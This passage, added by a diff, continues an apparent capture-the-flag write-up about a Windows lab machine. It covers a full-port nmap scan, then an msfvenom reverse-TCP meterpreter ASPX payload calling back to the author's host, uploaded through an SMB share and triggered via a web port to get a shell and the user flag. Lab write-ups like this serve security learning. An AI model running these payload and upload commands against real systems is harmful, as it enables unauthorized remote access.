@@ -90,3 +90,36 @@ Host script results:
 ...
 ```
 Next step is searching for SMBv1 
+However, I found nothing, I had to enumerate more
+I reckoned that there were still many hidden ports beside those common ones 
+So I checked all the hidden port via this command
+```python
+nmap -T4 -sV -vv -O -A -p- 10.10.225.34
+```
+Results:
+```note
+
+```
+The port 49663 was running on http.
+Accessing this port 49663
+![Image](https://github.com/user-attachments/assets/383e06e9-1fd4-44f5-8feb-3ef8c783fbf7)
+Nothing special for this one so I tried the directory of the smb group and found this
+![Image](https://github.com/user-attachments/assets/0f841027-bb53-469d-bbe0-1fd13f8cf6d1)
+Therefore, implementing a reverse meterpreter for this port is the best way via generating payload and upload that payload under the name Bill or Bob 
+```note
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.23.99.113 LPORT=1234 -f aspx -o metx64.aspx
+```
+```note
+smbclient   \\\\10.10.225.34\\nt4wrksv -U Bill
+Password for [WORKGROUP\Bill]:
+Try "help" to get a list of possible commands.
+smb: \> put metx64.aspx
+putting file metx64.aspx as \metx64.aspx (3.2 kb/s) (average 3.2 kb/s)
+```
+Setting up a multi/handler to recieve the connection
+![Image](https://github.com/user-attachments/assets/697351cf-5ef0-4706-8635-ac820428f6a3)
+First, trigger the payload by accessing to it via port 49663
+![Image](https://github.com/user-attachments/assets/f7df8b06-9071-4bd9-9ef0-916673f5ad22)
+Got the user flag
+![Image](https://github.com/user-attachments/assets/6986c040-aeed-49fa-b23b-9215dc342966)
+
